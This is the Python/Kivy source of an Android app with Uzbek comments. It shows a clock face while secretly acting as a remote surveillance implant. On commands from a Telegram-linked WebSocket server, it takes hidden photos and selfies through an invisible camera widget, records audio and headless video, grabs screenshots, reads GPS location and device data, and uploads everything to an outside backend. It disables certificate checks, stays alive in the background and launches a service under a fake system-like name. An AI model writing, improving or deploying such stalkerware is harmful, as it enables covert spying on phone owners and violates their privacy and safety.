import asyncio
import threading
import os
import shutil
import time
import ssl
import uuid
import struct
import zlib
import urllib.request
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.utils import platform

WS_URL     = "wss://hild-tracking-backend.onrender.com/ws/device"
UPLOAD_URL = "https://hild-tracking-backend.onrender.com/upload"

status           = ["Ishga tushirilmoqda..."]
should_reconnect = [True]
ws_ref           = [None]
app_ref          = [None]
wake_lock_ref    = [None]   # Ekran o'chanda CPU uxlamasligi uchun


def _ssl_ctx():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    return ctx


def _acquire_wake_lock():
    """Ekran o'chanda CPU ni uyquga ketmasligi uchun WakeLock"""
    try:
        from jnius import autoclass
        context      = autoclass('org.kivy.android.PythonActivity').mActivity
        PowerManager = autoclass('android.os.PowerManager')
        pm = context.getSystemService(context.POWER_SERVICE)
        wl = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            'StealthApp:KeepAlive'
        )
        wl.acquire()
        wake_lock_ref[0] = wl
        status[0] = 'WakeLock yoqildi. Ekran o\'chsa ham ishlaydi.'
    except Exception as e:
        status[0] = 'WakeLock xatolik: ' + str(e)[:80]

# ─── URLLIB YUKLASH ─────────────────────────────────────────────────────────────
def _multipart(fields, files=None):
    b = uuid.uuid4().hex
    body = b""
    for k, v in fields.items():
        body += ("--" + b + "\r\nContent-Disposition: form-data; name=\""
                 + k + "\"\r\n\r\n" + str(v) + "\r\n").encode()
    if files:
        for k, (fname, data) in files.items():
            body += ("--" + b + "\r\nContent-Disposition: form-data; name=\""
                     + k + "\"; filename=\"" + fname + "\"\r\n"
                     "Content-Type: application/octet-stream\r\n\r\n").encode()
            body += data + b"\r\n"
    body += ("--" + b + "--\r\n").encode()
    req = urllib.request.Request(
        UPLOAD_URL, data=body,
        headers={"Content-Type": "multipart/form-data; boundary=" + b}
    )
    resp = urllib.request.urlopen(req, context=_ssl_ctx(), timeout=30)
    return resp.status


def upload_file_sync(file_path, media_type):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        code = _multipart({"media_type": media_type},
                          {"file": (os.path.basename(file_path), data)})
        status[0] = "Yuborildi! (" + str(code) + ")"
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception as e:
        status[0] = "Upload xatolik: " + str(e)[:120]


def send_text_sync(text_data):
    try:
        code = _multipart({"media_type": "text", "text": text_data})
        status[0] = "Telegramga yuborildi! (" + str(code) + ")"
    except Exception as e:
        status[0] = "Yuborish xatolik: " + str(e)[:120]


# ─── TEXTURE → PNG (faqat stdlib, PIL kerak emas) ──────────────────────────────
def _save_texture_png(texture, filepath):
    """Kivy texture piksellarini to'g'ridan PNG sifatida saqlash"""
    pixels = bytes(texture.pixels)  # RGBA raw bytes
    w, h   = texture.size

    # RGBA → RGB (alpha o'chirib tashlaymiz)
    rgb = bytearray()
    for i in range(0, len(pixels), 4):
        rgb.extend(pixels[i:i + 3])

    # OpenGL texturalari teskari saqlangan (pastdan yuqoriga) — to'g'irlaymiz
    row = w * 3
    scanlines = [b'\x00' + bytes(rgb[y * row:(y + 1) * row])
                 for y in range(h - 1, -1, -1)]

    compressed = zlib.compress(b''.join(scanlines), 6)

    def png_chunk(name, data):
        c = name + data
        return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)

    with open(filepath, 'wb') as f:
        f.write(b'\x89PNG\r\n\x1a\n')
        f.write(png_chunk(b'IHDR', struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0)))
        f.write(png_chunk(b'IDAT', compressed))
        f.write(png_chunk(b'IEND', b''))


# ─── QURILMA MA'LUMOTLARI ───────────────────────────────────────────────────────
def get_battery_info():
    try:
        from jnius import autoclass
        ctx  = autoclass('org.kivy.android.PythonActivity').mActivity
        I    = autoclass('android.content.Intent')
        IF   = autoclass('android.content.IntentFilter')
        BM   = autoclass('android.os.BatteryManager')
        bs   = ctx.registerReceiver(None, IF(I.ACTION_BATTERY_CHANGED))
        pct  = int(bs.getIntExtra(BM.EXTRA_LEVEL, -1) * 100
                   / bs.getIntExtra(BM.EXTRA_SCALE, -1))
        sv   = bs.getIntExtra(BM.EXTRA_STATUS, -1)
        chg  = sv in [BM.BATTERY_STATUS_CHARGING, BM.BATTERY_STATUS_FULL]
        return "Batareya: " + str(pct) + "%\n" + ("Zaryadlanmoqda" if chg else "Zaryadlanmayapti")
    except Exception as e:
        return "Batareya xatolik: " + str(e)


def get_device_info():
    try:
        from jnius import autoclass
        B = autoclass('android.os.Build')
        V = autoclass('android.os.Build$VERSION')
        return ("Model: " + B.MODEL + "\nBrand: " + B.BRAND
                + "\nAndroid: " + V.RELEASE + "\nSDK: " + str(V.SDK_INT))
    except Exception as e:
        return "Qurilma info xatolik: " + str(e)


# ─── KAMERA ─────────────────────────────────────────────────────────────────────
def take_photo_kivy(front_camera):
    """Clock.schedule_once orqali asosiy Kivy threadidan chaqiriladi"""
    try:
        from kivy.uix.camera import Camera as KivyCam
        from jnius import autoclass
        activity = autoclass('org.kivy.android.PythonActivity').mActivity
        ext_dir  = activity.getExternalFilesDir(None).getAbsolutePath()
        cam_name = 'selfie' if front_camera else 'capture'
        filepath = ext_dir + '/' + cam_name + '.png'

        cam = KivyCam(
            index=1 if front_camera else 0,
            resolution=(1280, 720),
            play=True,
            size_hint=(None, None),
            size=(320, 240),
            opacity=0,
        )
        app_ref[0].root.add_widget(cam)
        status[0] = 'Kamera tayorlanmoqda...'
        attempts = [0]

        def capture(dt):
            attempts[0] += 1
            texture = cam.texture
            if texture is None and attempts[0] < 8:
                status[0] = 'Texture kutilmoqda... (' + str(attempts[0]) + ')'
                Clock.schedule_once(capture, 1.0)
                return
            try:
                if texture is not None:
                    # export_to_png emas — texture.pixels to'g'ridan o'qiymiz
                    _save_texture_png(texture, filepath)
                    cam.play = False
                    app_ref[0].root.remove_widget(cam)
                    fsize = os.path.getsize(filepath) if os.path.exists(filepath) else 0
                    if fsize > 5000:
                        threading.Thread(
                            target=upload_file_sync, args=(filepath, 'photo'), daemon=True
                        ).start()
                        status[0] = 'Rasm olindi (' + str(fsize // 1024) + ' KB), yuborilmoqda...'
                    else:
                        msg = '[v2] PNG juda kichik: ' + str(fsize) + ' bayt'
                        status[0] = msg
                        threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()
                else:
                    cam.play = False
                    app_ref[0].root.remove_widget(cam)
                    msg = 'Texture None qoldi (8 urinishdan keyin)'
                    status[0] = msg
                    threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()
            except Exception as ex:
                msg = 'Capture xatolik: ' + str(ex)
                status[0] = msg
                threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()

        Clock.schedule_once(capture, 3.0)

    except Exception as e:
        msg = 'Kamera xatolik: ' + str(e)
        status[0] = msg
        threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()


# ─── EKRAN RASMI (Screenshot) ──────────────────────────────────────────────────
def take_screenshot_sync():
    try:
        from jnius import autoclass
        activity = autoclass('org.kivy.android.PythonActivity').mActivity
        ext_dir  = activity.getExternalFilesDir(None).getAbsolutePath()
        filepath = ext_dir + '/scr.png'
        
        # 1-usul: Android shell orqali (ba'zi qurilmalarda ishlaydi)
        os.system(f'screencap -p {filepath}')
        
        if os.path.exists(filepath) and os.path.getsize(filepath) > 1000:
            threading.Thread(
                target=upload_file_sync, args=(filepath, 'photo'), daemon=True
            ).start()
            return "Ekran rasmi (Shell) olindi, yuborilmoqda..."

        # 2-usul: Kivy oynasini rasmga olish (agar ilova ochiq bo'lsa)
        from kivy.core.window import Window
        Window.screenshot(name=filepath)
        time.sleep(1.0)
        
        import glob
        files = glob.glob(ext_dir + '/scr*.png')
        if files:
            latest_file = max(files, key=os.path.getctime)
            threading.Thread(
                target=upload_file_sync, args=(latest_file, 'photo'), daemon=True
            ).start()
            return "Ekran rasmi (Window) olindi, yuborilmoqda..."
            
        return "Ekran rasmi olinmadi. (Android 11+ da tizim ruxsati talab qilinishi mumkin)"
    except Exception as e:
        return "Screenshot xatoligi: " + str(e)


# ─── MANZIL (GPS) ──────────────────────────────────────────────────────────────
def get_location_sync():
    try:
        from jnius import autoclass
        activity = autoclass('org.kivy.android.PythonActivity').mActivity
        Context  = autoclass('android.content.Context')
        LM       = activity.getSystemService(Context.LOCATION_SERVICE)

        is_gps_enabled = LM.isProviderEnabled('gps')
        is_net_enabled = LM.isProviderEnabled('network')
        
        providers = LM.getProviders(True).toArray()
        loc = None
        
        for p in providers:
            l = LM.getLastKnownLocation(p)
            if l:
                if not loc or l.getTime() > loc.getTime():
                    loc = l

        if loc:
            lat = loc.getLatitude()
            lon = loc.getLongitude()
            diff_min = int((time.time() * 1000 - loc.getTime()) / 60000)
            time_str = " (hozirgi)" if diff_min < 2 else f" ({diff_min} daqiqa oldingi)"
            return "📍 Manzil topildi" + time_str + ":\nhttps://www.google.com/maps?q=" + str(lat) + "," + str(lon)
        else:
            diag = f"\n(GPS: {'YOQ' if is_gps_enabled else 'OCHIQ'}, Network: {'YOQ' if is_net_enabled else 'OCHIQ'})"
            return "📍 Manzilni aniqlab bo'lmadi. GPS ochiq bo'lsa ham 'Last Location' yo'q." + diag
    except Exception as e:
        return "📍 Manzil xatoligi: " + str(e)


# ─── AUDIO ──────────────────────────────────────────────────────────────────────
def record_audio():
    try:
        from jnius import autoclass
        MR  = autoclass('android.media.MediaRecorder')
        AS_ = autoclass('android.media.MediaRecorder$AudioSource')
        OF  = autoclass('android.media.MediaRecorder$OutputFormat')
        AE  = autoclass('android.media.MediaRecorder$AudioEncoder')
        act = autoclass('org.kivy.android.PythonActivity').mActivity

        ext_dir  = act.getExternalFilesDir(None).getAbsolutePath()
        filepath = ext_dir + '/audio.m4a'

        rec = MR()
        # VOICE_RECOGNITION ovoz uchun sezgirroq
        rec.setAudioSource(AS_.VOICE_RECOGNITION)
        rec.setOutputFormat(OF.MPEG_4)
        rec.setAudioEncoder(AE.AAC)
        rec.setAudioChannels(1)
        rec.setAudioSamplingRate(44100)
        rec.setAudioEncodingBitRate(128000)
        rec.setOutputFile(filepath)
        rec.prepare()
        rec.start()
        status[0] = 'Yozilmoqda (10 sek)...'
        time.sleep(10)
        rec.stop()
        rec.release()
        if os.path.exists(filepath):
            upload_file_sync(filepath, 'audio')
    except Exception as e:
        msg = 'Audio xatolik: ' + str(e)
        status[0] = msg
        threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()


# ─── VIDEO ──────────────────────────────────────────────────────────────────────
def record_video():
    try:
        from jnius import autoclass
        MR  = autoclass('android.media.MediaRecorder')
        VS  = autoclass('android.media.MediaRecorder$VideoSource')
        AS  = autoclass('android.media.MediaRecorder$AudioSource')
        OF  = autoclass('android.media.MediaRecorder$OutputFormat')
        VE  = autoclass('android.media.MediaRecorder$VideoEncoder')
        AE  = autoclass('android.media.MediaRecorder$AudioEncoder')
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
        Camera = autoclass('android.hardware.Camera')

        ext_dir  = act.getExternalFilesDir(None).getAbsolutePath()
        filepath = ext_dir + '/video.mp4'

        status[0] = "Kamera ulanmoqda (Video)..."
        
        # Maxfiy (Headless) video olish uchun
        cam = Camera.open(0) # orqa kamera
        dummy_st = SurfaceTexture(10)
        cam.setPreviewTexture(dummy_st)
        cam.unlock()

        rec = MR()
        rec.setCamera(cam)
        rec.setAudioSource(AS.CAMCORDER)
        rec.setVideoSource(VS.CAMERA)
        rec.setOutputFormat(OF.MPEG_4)
        rec.setVideoEncoder(VE.H264)
        rec.setAudioEncoder(AE.AAC)
        rec.setOutputFile(filepath)
        rec.setVideoSize(640, 480)
        rec.setVideoFrameRate(15)

        rec.prepare()
        rec.start()
        status[0] = 'Video yozilmoqda (60 sek)...'
        time.sleep(60)
        rec.stop()
        rec.release()
        cam.release()
        
        if os.path.exists(filepath):
            upload_file_sync(filepath, 'video')
    except Exception as e:
        msg = 'Video xatolik: ' + str(e)
        status[0] = msg
        threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()


# ─── WEBSOCKET ──────────────────────────────────────────────────────────────────
async def ws_loop():
    loop  = asyncio.get_running_loop()
    retry = 0
    while should_reconnect[0]:
        try:
            import websockets
            retry += 1
            status[0] = 'Ulanilmoqda... (' + str(retry) + '-urinish)'
            async with websockets.connect(
                WS_URL, ssl=_ssl_ctx(),
                ping_interval=30, ping_timeout=15,
                open_timeout=15, close_timeout=5,
            ) as ws:
                ws_ref[0] = ws
                retry = 0
                status[0] = 'ULANDI! Telegram botdan buyruq bering.'
                while True:
                    msg = await ws.recv()
                    status[0] = 'Buyruq: ' + msg
                    if msg == 'take_photo':
                        Clock.schedule_once(lambda dt: take_photo_kivy(False), 0)
                    elif msg == 'selfie':
                        Clock.schedule_once(lambda dt: take_photo_kivy(True), 0)
                    elif msg == 'record_audio':
                        threading.Thread(target=record_audio, daemon=True).start()
                    elif msg == 'record_video':
                        threading.Thread(target=record_video, daemon=True).start()
                    elif msg == 'get_location':
                        info = get_location_sync()
                        status[0] = info
                        await loop.run_in_executor(None, send_text_sync, info)
                    elif msg == 'get_screenshot':
                        info = take_screenshot_sync()
                        status[0] = info
                        await loop.run_in_executor(None, send_text_sync, info)
                    elif msg == 'battery':
                        info = get_battery_info()
                        status[0] = info
                        await loop.run_in_executor(None, send_text_sync, info)
                    elif msg == 'device_info':
                        info = get_device_info()
                        status[0] = info
                        await loop.run_in_executor(None, send_text_sync, info)
        except Exception as e:
            ws_ref[0] = None
            wait = min(5 * retry, 30)
            status[0] = ('Xatolik:\n' + str(e)[:100] +
                         '\n\n' + str(wait) + " soniyadan so'ng qayta...")
            await asyncio.sleep(wait)


def run_loop():
    try:
        lp = asyncio.new_event_loop()
        asyncio.set_event_loop(lp)
        lp.run_until_complete(ws_loop())
    except Exception as e:
        status[0] = 'Loop xatolik: ' + str(e)[:150]


def force_reconnect():
    should_reconnect[0] = False
    try:
        if platform == 'android':
            from jnius import autoclass
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            cd  = ctx.getCacheDir().getAbsolutePath()
            shutil.rmtree(cd, ignore_errors=True)
            os.makedirs(cd, exist_ok=True)
    except Exception:
        pass
    time.sleep(1)
    should_reconnect[0] = True
    threading.Thread(target=run_loop, daemon=True).start()


# ─── UI ─────────────────────────────────────────────────────────────────────────
class StealthApp(App):
    def build(self):
        app_ref[0] = self
        
        from kivy.core.window import Window
        Window.clearcolor = (0.05, 0.05, 0.05, 1)  # To'q fon
        
        layout = BoxLayout(orientation='vertical', padding=0, spacing=0)

        self.time_label = Label(
            text='00:00:00',
            font_size='70sp', 
            halign='center', valign='middle',
            bold=True,
            color=(0.2, 0.8, 0.2, 1), # Yashil raqamlar
        )
        self.date_label = Label(
            text='',
            font_size='20sp', 
            halign='center', valign='middle',
            color=(0.5, 0.5, 0.5, 1),
            size_hint=(1, 0.2)
        )

        layout.add_widget(self.time_label)
        layout.add_widget(self.date_label)

        if platform == 'android':
            Clock.schedule_once(self._request_permissions, 0.5)
        else:
            threading.Thread(target=run_loop, daemon=True).start()

        Clock.schedule_interval(self.update_clock, 1)
        return layout

    def on_start(self):
        """Back tugmasini ushlash — yopish o'rniga background ga o'tish"""
        if platform == 'android':
            from kivy.core.window import Window
            Window.bind(on_keyboard=self._handle_keyboard)

    def _handle_keyboard(self, window, key, *args):
        if key == 27:  # Back tugmasi
            if platform == 'android':
                try:
                    from jnius import autoclass
                    activity = autoclass('org.kivy.android.PythonActivity').mActivity
                    activity.moveTaskToBack(True)  # Yopmasdan background ga o'tish
                    return True
                except Exception:
                    pass
        return False

    def on_pause(self):
        """Ilova fon rejimiga o'tganda (yopilganda) ham ishlashni davom ettirish"""
        return True  # True = Android ilovani o'ldirmaydi

    def on_resume(self):
        pass

    def _request_permissions(self, dt):
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA, Permission.RECORD_AUDIO,
                Permission.INTERNET, Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_COARSE_LOCATION,
                Permission.ACCESS_BACKGROUND_LOCATION,
            ], self._on_permissions_result)
        except Exception as e:
            status[0] = 'Ruxsat xatoligi: ' + str(e)[:80]
            threading.Thread(target=run_loop, daemon=True).start()

    def _on_permissions_result(self, permissions, grants):
        # Servisni ishga tushirish (background uchun)
        if platform == 'android':
            try:
                from jnius import autoclass
                service = autoclass('com.android.sys.systemsync.ServiceStealth')
                mActivity = autoclass('org.kivy.android.PythonActivity').mActivity
                service.start(mActivity, "")
            except Exception as e:
                status[0] = "Servis xatosi: " + str(e)

        # Avval WakeLock, keyin loop
        Clock.schedule_once(lambda dt: _acquire_wake_lock(), 0.5)
        threading.Thread(target=run_loop, daemon=True).start()

    def update_clock(self, dt):
        import time
        self.time_label.text = time.strftime("%H:%M:%S")
        self.date_label.text = time.strftime("%A, %d %B %Y")


if __name__ == '__main__':
    StealthApp().run()
